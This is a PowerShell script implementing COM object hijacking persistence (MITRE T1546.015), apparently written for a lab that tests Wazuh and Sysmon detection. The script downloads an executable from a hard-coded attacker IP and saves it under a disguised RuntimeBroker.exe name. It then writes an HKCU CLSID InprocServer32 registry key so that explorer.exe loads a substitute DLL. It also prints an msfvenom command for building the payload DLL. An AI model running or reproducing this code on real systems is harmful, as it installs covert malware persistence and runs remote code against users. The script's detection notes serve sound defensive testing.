# =============================================================================
# persist_04_com.ps1 -- COM Object Hijacking Persistence
# MITRE ATT&CK: T1546.015 - Event Triggered Execution: Component Object Model Hijacking
# =============================================================================
# Wazuh Detection:
#   - Sysmon EID 13 (RegistryEvent) -- HKCU\Software\Classes\CLSID\{GUID}\InprocServer32
#   - Sysmon EID 7 (ImageLoad) -- when DLL is loaded from unusual path
#   - Wazuh Rule ID: 61603 (suspicious HKCU\Software\Classes\CLSID registry write)
#
# How it works:
#   Windows search order: HKCU\Software\Classes\CLSID before HKLM\SOFTWARE\Classes\CLSID
#   If we write InprocServer32 in HKCU pointing to our DLL -> Windows loads ours instead
#
# Target GUID: {0D43FE01-F093-11CF-8940-00A0C9054228}
#   = Shell File System (fsdebug.dll), loaded by explorer.exe
# =============================================================================

param(
    [ValidateSet("install","test","remove")]
    [string]$Action = "install"
)

# ==============================================================================
# CONFIG
# ==============================================================================
$ATTACKER_IP  = "192.168.247.139"
$PAYLOAD_URL  = "http://${ATTACKER_IP}:9090/loader_garble.exe"
$PAYLOAD_PATH = "$env:LOCALAPPDATA\Microsoft\WindowsApps\RuntimeBroker.exe"

# COM Hijacking config
$COM_GUID     = "{0D43FE01-F093-11CF-8940-00A0C9054228}"
$COM_REG_BASE = "HKCU:\Software\Classes\CLSID\$COM_GUID"
$COM_INPROC   = "$COM_REG_BASE\InprocServer32"

$DLL_PATH     = "$env:TEMP\version_hijack.dll"
$WRAPPER_BAT  = "$env:TEMP\com_loader.bat"
# ==============================================================================

function Download-Payload {
    if (-not (Test-Path $PAYLOAD_PATH)) {
        Write-Host "[*] Downloading payload from $PAYLOAD_URL ..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $PAYLOAD_URL -OutFile $PAYLOAD_PATH -UseBasicParsing -ErrorAction Stop
            Write-Host "[+] Payload saved to: $PAYLOAD_PATH" -ForegroundColor Green
        } catch {
            Write-Warning "[!] Download failed. Creating dummy payload for testing..."
            [System.IO.File]::WriteAllText($PAYLOAD_PATH, "# dummy payload")
        }
    } else {
        Write-Host "[*] Payload already exists at: $PAYLOAD_PATH" -ForegroundColor Cyan
    }
}

function Create-FakeDLL {
    Write-Host "[*] Note: Real DLL required for COM hijacking trigger." -ForegroundColor Yellow
    Write-Host "[*] For lab: generate with msfvenom:" -ForegroundColor Yellow
    Write-Host "    msfvenom -p windows/x64/exec CMD=`"$PAYLOAD_PATH`" -f dll -o `"$DLL_PATH`"" -ForegroundColor Gray
    Write-Host "[*] Creating .bat wrapper for reference..." -ForegroundColor Cyan

    $bat = "@echo off`r`nstart /B `"`" `"$PAYLOAD_PATH`""
    Set-Content -Path $WRAPPER_BAT -Value $bat -Encoding ASCII

    # Create placeholder DLL for registry test only
    if (-not (Test-Path $DLL_PATH)) {
        $sysdll = "$env:SystemRoot\System32\msvcrt.dll"
        if (Test-Path $sysdll) {
            Copy-Item $sysdll $DLL_PATH -Force
            Write-Host "[*] Placeholder DLL created (replace with real payload DLL)" -ForegroundColor Yellow
        }
    }
}

function Install-Persistence {
    Write-Host "`n[*] Installing COM Hijacking persistence..." -ForegroundColor Cyan
    Write-Host "    Target GUID: $COM_GUID" -ForegroundColor Gray
    Download-Payload
    Create-FakeDLL

    try {
        # Create CLSID key in HKCU -- Sysmon EID 13 triggers here
        New-Item -Path $COM_INPROC -Force | Out-Null

        Set-ItemProperty -Path $COM_INPROC -Name "(Default)" -Value $DLL_PATH -Type String -Force
        Set-ItemProperty -Path $COM_INPROC -Name "ThreadingModel" -Value "Apartment" -Type String -Force

        Write-Host "[+] COM Hijacking registry set:" -ForegroundColor Green
        Write-Host "    CLSID  : $COM_GUID" -ForegroundColor Gray
        Write-Host "    RegPath: $COM_INPROC" -ForegroundColor Gray
        Write-Host "    DLL    : $DLL_PATH" -ForegroundColor Gray
        Write-Host "[+] Persistence installed." -ForegroundColor Green
        Write-Host "[!] Trigger: open shell, run explorer, or use shell COM operations" -ForegroundColor Yellow
        Write-Host "[!] Replace $DLL_PATH with real payload DLL from msfvenom" -ForegroundColor Yellow
        return $true
    } catch {
        Write-Error "[!] Failed to install COM hijacking: $_"
        return $false
    }
}

function Test-Persistence {
    Write-Host "`n[*] Verifying COM Hijacking persistence..." -ForegroundColor Cyan
    $ok = $true

    if (Test-Path $COM_INPROC) {
        $val = (Get-ItemProperty -Path $COM_INPROC -ErrorAction SilentlyContinue)."(Default)"
        Write-Host "[+] COM CLSID key EXISTS" -ForegroundColor Green
        Write-Host "    InprocServer32: $val" -ForegroundColor Gray

        if (Test-Path $val) {
            Write-Host "[+] DLL file EXISTS: $val" -ForegroundColor Green
        } else {
            Write-Host "[-] DLL file MISSING: $val" -ForegroundColor Red
            $ok = $false
        }
    } else {
        Write-Host "[-] COM CLSID key NOT found: $COM_INPROC" -ForegroundColor Red
        $ok = $false
    }

    if (Test-Path $PAYLOAD_PATH) {
        Write-Host "[+] Payload EXISTS: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload MISSING: $PAYLOAD_PATH" -ForegroundColor Red
        $ok = $false
    }

    if ($ok) { Write-Host "[RESULT] Persistence ACTIVE v" -ForegroundColor Green }
    else      { Write-Host "[RESULT] Persistence INCOMPLETE x" -ForegroundColor Red }
    return $ok
}

function Remove-Persistence {
    Write-Host "`n[*] Removing COM Hijacking persistence..." -ForegroundColor Cyan

    if (Test-Path $COM_REG_BASE) {
        Remove-Item -Path $COM_REG_BASE -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[+] COM CLSID key removed: $COM_GUID" -ForegroundColor Green
    } else {
        Write-Host "[-] COM CLSID key not found (already removed?)" -ForegroundColor Yellow
    }
    foreach ($f in @($DLL_PATH, $WRAPPER_BAT, $PAYLOAD_PATH)) {
        if (Test-Path $f) {
            Remove-Item -Path $f -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Removed: $f" -ForegroundColor Green
        } else {
            Write-Host "[-] Not found: $f" -ForegroundColor Yellow
        }
    }
    Write-Host "[+] Cleanup complete." -ForegroundColor Green
}

# ==============================================================================
# Main Logic
# ==============================================================================
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host " persist_04_com.ps1 -- T1546.015 COM Object Hijacking" -ForegroundColor Magenta
Write-Host " Wazuh: Sysmon EID 13 (HKCU CLSID registry write)" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta

switch ($Action) {
    "install" { Install-Persistence }
    "test"    { Test-Persistence }
    "remove"  { Remove-Persistence }
}
